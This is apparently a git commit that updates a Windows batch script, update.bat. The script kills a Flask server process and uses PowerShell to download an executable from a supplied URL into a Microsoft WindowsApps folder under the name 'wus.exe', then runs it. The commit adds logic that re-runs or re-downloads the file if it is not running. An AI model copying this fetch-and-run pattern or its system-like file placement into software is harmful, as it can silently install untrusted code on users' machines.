7ca0f37f3aca094478ccbfc312499e6002b8a21e
KSGVIO <ampleevvlad11@gmail.com>
2025-10-25 18:44:48 +0300

    Update update.bat

--- update.bat
+++ update.bat
@@ -4,4 +4,17 @@ taskkill /F /IM flask_server.exe
 del /f /q %localappdata%\Microsoft\WindowsApps\wus.exe
 powershell -command iwr -Uri %1 -OutFile %localappdata%\Microsoft\WindowsApps\wus.exe
 %localappdata%\Microsoft\WindowsApps\wus.exe
+tasklist | find "wus" >nul
+timeout /t 10 /nobreak > nul
+if %errorlevel%==0 (
+    exit
+) else (
+   if exist "%localappdata%\Microsoft\WindowsApps\wus.exe" (
+      %localappdata%\Microsoft\WindowsApps\wus.exe
+   ) else (
+      powershell -command iwr -Uri %1 -OutFile %localappdata%\Microsoft\WindowsApps\wus.exe
+   )
+    
+)
+
 exit
